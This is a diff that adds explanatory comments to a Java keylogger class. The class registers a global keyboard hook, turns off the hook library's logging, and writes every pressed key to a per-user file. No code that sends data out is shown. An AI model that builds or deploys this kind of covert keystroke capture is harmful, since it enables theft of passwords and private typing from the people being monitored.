@@ -20,14 +20,15 @@ public class KeyLogger implements NativeKeyListener {
         kf = new KeyLoggerFile(user);
 
         try {
-            GlobalScreen.registerNativeHook();
-            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
-            logger.setLevel(Level.OFF);
+            GlobalScreen.registerNativeHook(); // Register Native Hook
+            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName()); // get access to log request
+                                                                                         // from GlobalScreen
+            logger.setLevel(Level.OFF); // set GlobalScreen log request to OFF
         } catch (NativeHookException e) {
             System.out.println("Error: " + e.getMessage());
         }
 
-        GlobalScreen.addNativeKeyListener(this);
+        GlobalScreen.addNativeKeyListener(this); // Listen the key event and internally invoke relative method
     }
 
     public static void main(String args[]) {
@@ -36,13 +37,14 @@ public class KeyLogger implements NativeKeyListener {
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent key) {
+        // not required
     }
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent key) {
         CharSequence text = NativeKeyEvent.getKeyText(key.getKeyCode()) + "\n";
         try {
-            kf.keyLoggerWriter(text);
+            kf.keyLoggerWriter(text); // invoke keyloggerwriter method which store the key value.
         } catch (IOException e) {
             System.out.println("Error: " + e.getMessage());
         }
@@ -50,5 +52,6 @@ public class KeyLogger implements NativeKeyListener {
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent key) {
+        // not required
     }
 }
